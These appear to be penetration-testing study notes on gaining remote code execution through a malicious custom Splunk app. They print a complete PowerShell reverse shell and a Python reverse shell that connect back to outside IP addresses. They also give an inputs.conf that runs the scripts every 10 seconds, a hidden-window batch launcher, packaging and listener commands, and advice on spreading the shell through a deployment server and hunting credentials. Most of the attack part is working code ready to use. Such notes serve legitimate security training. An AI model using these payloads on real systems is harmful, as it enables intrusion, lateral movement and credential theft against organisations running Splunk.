From the Nmap discovery scan, we noticed that our target is a Windows server. 
Since Splunk comes with Python installed, **==we can create a custom Splunk application that gives us remote code execution using Python or a PowerShell script.==**


# Abusing Built-In Functionality
----
- We **==can use [this](https://github.com/0xjpuff/reverse_shell_splunk) Splunk package to assist us==**. The `bin` directory in this repo has examples for [Python](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/rev.py) and [PowerShell](https://github.com/0xjpuff/reverse_shell_splunk/blob/master/reverse_shell_splunk/bin/run.ps1). Let's walk through this step-by-step.

- To achieve this, we first need to create a custom Splunk application using the following directory structure:
	- ![[Pasted image 20260721015353.png]]

- The **==`bin` directory will contain any scripts that we intend to run==** (in this case, a PowerShell reverse shell), and the **==default directory will have our `inputs.conf` file==**. Our reverse shell will be a PowerShell one-liner:

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.15.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

- The **==[inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) file tells Splunk which script to run and any other conditions==**. 
- Here we set the **app as enabled and tell Splunk to run the script every 10 seconds**. The interval is always in seconds, and the input (script) will only run if this setting is present.

```json inputs.conf
	[script://./bin/rev.py]
	disabled = 0  
	interval = 10  
	sourcetype = shell 
	
	[script://.\bin\run.bat]
	disabled = 0
	sourcetype = shell
	interval = 10
```

- We need the **==.bat file, which will run when the application is deployed and execute the PowerShell one-liner.==**:
```powershell
	@ECHO OFF
	PowerShell.exe -exec bypass -w hidden -Command "& '%~dpn0.ps1'"
	Exit
```

- Once the files are created, **==we can create a tarball or `.spl` file.==**:
	- `tar -cvzf updater.tar.gz splunk_shell/`
	- ![[Pasted image 20260721015733.png]]

- The next step is to **choose `Install app from file` and upload the application.**:
	- ![[Pasted image 20260721015759.png]]
- Before uploading the malicious custom app, **let's start a listener using Netcat or [socat](https://linux.die.net/man/1/socat).:**
	- `nc -lnvp 443`

- On the **`Upload app` page, click on browse, choose the tarball** we created earlier and click `Upload`:
	- ![[Pasted image 20260721015838.png]]
- As soon as we upload the application, a reverse shell is received as the status of the application will automatically be switched to `Enabled`:
	- ![[Pasted image 20260721015853.png]]

- this were a real-world assessment, **==we could proceed to enumerate the target for credentials in the registry, memory, or stored elsewhere on the file system to use for lateral movement within the network.==**
- If we were dealing with a **Linux host, we would need to edit the `rev.py` Python script before creating the tarball and uploading the custom malicious app**. The rest of the process would be the same, and we would get a reverse shell connection on our Netcat listener and be off to the races:
```python
	import sys,socket,os,pty
	
	ip="10.10.14.15"
	port="443"
	s=socket.socket()
	s.connect((ip,int(port)))
	[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
	pty.spawn('/bin/bash')
```

- If the compromised Splunk host is a deployment server, it will likely be possible to achieve RCE on any hosts with Universal Forwarders installed on them. To push a reverse shell out to other hosts, the application must be placed in the `$SPLUNK_HOME/etc/deployment-apps` directory on the compromised host.
- In a Windows-heavy environment, we will need to create an application using a PowerShell reverse shell since the Universal forwarders do not install with Python like the Splunk server.

![[Pasted image 20260721023635.png]]